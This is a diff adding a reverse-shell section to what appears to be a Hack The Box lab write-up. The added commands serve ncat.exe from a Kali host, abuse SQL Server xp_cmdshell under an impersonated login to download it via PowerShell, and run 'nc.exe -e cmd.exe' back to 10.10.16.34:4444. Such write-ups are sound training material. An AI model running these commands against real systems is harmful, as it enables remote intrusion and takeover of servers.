@@ -203,10 +203,43 @@ HTB-OPS-4471 EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'type C:\Users\s
 ----
 
 
+## get reverseshell
+
+```
+# On Kali: Download ncat.exe (Windows binary)
+wget https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe
+
+# On Kali: Start a web server to serve the binary
+python3 -m http.server 8000
+```
+
+## Download ncat.exe to the target
+
+```
+HTB-OPS-4471 EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'powershell -c "iwr -uri http://10.10.16.34:8000/ncat.exe -OutFile C:\Windows\Temp\nc.exe"'; REVERT;
+```
 
 
+## Start the Listener
+
+```
+nc -lvnp 4444
+```
 
 
+## Execute the reverse shell
+
+
+```
+HTB-OPS-4471 EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe 10.10.16.34 4444'; REVERT;
+```
+
+<img width="1650" height="300" alt="image" src="https://github.com/user-attachments/assets/0bfd9683-969d-4157-b5ba-a98ac7e8ee0f" />
+
+
+----
+
+## privesc
 
 
 
